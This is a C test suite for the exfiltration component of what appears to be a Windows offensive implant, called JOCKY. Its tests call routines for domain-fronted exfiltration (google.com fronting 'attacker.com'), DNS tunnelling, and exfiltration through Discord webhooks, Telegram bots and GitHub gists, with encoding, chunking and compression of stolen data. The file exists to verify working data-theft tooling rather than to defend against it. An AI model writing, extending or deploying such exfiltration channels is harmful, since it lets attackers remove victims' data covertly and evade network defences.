#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include "../../src/runtime/windows/exfil/enhanced_exfiltration.h"

/* Test framework */
static int test_count = 0;
static int test_passed = 0;

#define TEST(name) \
    do { \
        printf("[TEST] %s... ", name); \
        test_count++; \
    } while(0)

#define PASS() \
    do { \
        printf("PASS\n"); \
        test_passed++; \
    } while(0)

#define FAIL(msg) \
    do { \
        printf("FAIL: %s\n", msg); \
    } while(0)

/* Test 1: Underminr initialization */
void test_underminr_init(void)
{
    TEST("Exfiltration: Underminr initialization");

    UNDERMINR_CONFIG config;
    int result = jocky_underminr_init(
        "www.google.com",
        "attacker.com",
        &config);

    if (result == 0 && config.port == 443) {
        PASS();
    } else {
        FAIL("Init should setup config correctly");
    }
}

/* Test 2: Base32 encoding */
void test_base32_encoding(void)
{
    TEST("Exfiltration: Base32 encoding");

    uint8_t input[] = "test";
    char output[256];

    int result = jocky_encode_data_base32(input, strlen((char*)input), output, sizeof(output));

    if (result > 0 && strlen(output) > 0) {
        PASS();
    } else {
        FAIL("Should encode to base32");
    }
}

/* Test 3: Base64 encoding */
void test_base64_encoding(void)
{
    TEST("Exfiltration: Base64 encoding");

    uint8_t input[] = "test";
    char output[256];

    int result = jocky_encode_data_base64(input, strlen((char*)input), output, sizeof(output));

    if (result > 0 && strlen(output) > 0) {
        PASS();
    } else {
        FAIL("Should encode to base64");
    }
}

/* Test 4: Data chunking */
void test_data_chunking(void)
{
    TEST("Exfiltration: Data chunking");

    uint8_t data[1024];
    memset(data, 0x41, sizeof(data));

    uint8_t* chunks = NULL;
    int chunk_count = 0;

    int result = jocky_split_into_chunks(data, sizeof(data), 256, &chunks, &chunk_count);

    if (result == 0 && chunk_count == 4) {
        free(chunks);
        PASS();
    } else {
        FAIL("Should split into correct number of chunks");
    }
}

/* Test 5: DNS tunnel initialization */
void test_dns_tunnel_init(void)
{
    TEST("Exfiltration: DNS tunnel initialization");

    DNS_TUNNEL_CONFIG config;
    int result = jocky_dns_tunnel_init("8.8.8.8", &config);

    if (result == 0 && config.chunk_size > 0) {
        PASS();
    } else {
        FAIL("Should initialize DNS config");
    }
}

/* Test 6: Discord exfiltration function exists */
void test_discord_function(void)
{
    TEST("Exfiltration: Discord exfil function");

    uint8_t data[100];
    memset(data, 0, sizeof(data));

    int result = jocky_discord_exfil("https://webhook.url", data, sizeof(data), 50);

    if (result == 0 || result == -1) {
        PASS();
    } else {
        FAIL("Function should be callable");
    }
}

/* Test 7: Telegram exfiltration function */
void test_telegram_function(void)
{
    TEST("Exfiltration: Telegram exfil function");

    uint8_t data[100];
    memset(data, 0, sizeof(data));

    int result = jocky_telegram_exfil("bot_token", "chat_id", data, sizeof(data), 50);

    if (result == 0 || result == -1) {
        PASS();
    } else {
        FAIL("Function should be callable");
    }
}

/* Test 8: GitHub exfiltration function */
void test_github_function(void)
{
    TEST("Exfiltration: GitHub exfil function");

    uint8_t data[100];
    memset(data, 0, sizeof(data));

    int result = jocky_github_exfil("github_token", "gist_id", data, sizeof(data));

    if (result == 0 || result == -1) {
        PASS();
    } else {
        FAIL("Function should be callable");
    }
}

/* Test 9: Invalid input handling for encoding */
void test_invalid_encoding_input(void)
{
    TEST("Exfiltration: Invalid encoding input");

    int result = jocky_encode_data_base32(NULL, 0, NULL, 0);

    if (result == -1) {
        PASS();
    } else {
        FAIL("Should reject invalid inputs");
    }
}

/* Test 10: Small output buffer handling */
void test_small_buffer(void)
{
    TEST("Exfiltration: Small output buffer");

    uint8_t input[100];
    memset(input, 0x42, sizeof(input));
    char output[5];  /* Too small */

    int result = jocky_encode_data_base32(input, sizeof(input), output, sizeof(output));

    if (result == -1) {
        PASS();
    } else {
        FAIL("Should handle small buffer");
    }
}

/* Test 11: Empty data encoding */
void test_empty_data_encoding(void)
{
    TEST("Exfiltration: Empty data encoding");

    uint8_t input[1];
    char output[256];

    int result = jocky_encode_data_base64(input, 0, output, sizeof(output));

    if (result >= 0) {
        PASS();
    } else {
        FAIL("Should handle empty data");
    }
}

/* Test 12: Compression stub function */
void test_compression_function(void)
{
    TEST("Exfiltration: Compression function");

    uint8_t input[1000];
    uint8_t output[1000];
    int output_size = sizeof(output);

    memset(input, 0x41, sizeof(input));

    int result = jocky_compress_for_exfil(input, sizeof(input), output, &output_size);

    if (result == 0 || result == -1) {
        PASS();
    } else {
        FAIL("Function should be callable");
    }
}

/* Run all tests */
int main(void)
{
    printf("=== JOCKY Exfiltration Test Suite ===\n\n");

    test_underminr_init();
    test_base32_encoding();
    test_base64_encoding();
    test_data_chunking();
    test_dns_tunnel_init();
    test_discord_function();
    test_telegram_function();
    test_github_function();
    test_invalid_encoding_input();
    test_small_buffer();
    test_empty_data_encoding();
    test_compression_function();

    printf("\n=== Results ===\n");
    printf("Passed: %d/%d\n", test_passed, test_count);

    return (test_passed == test_count) ? 0 : 1;
}
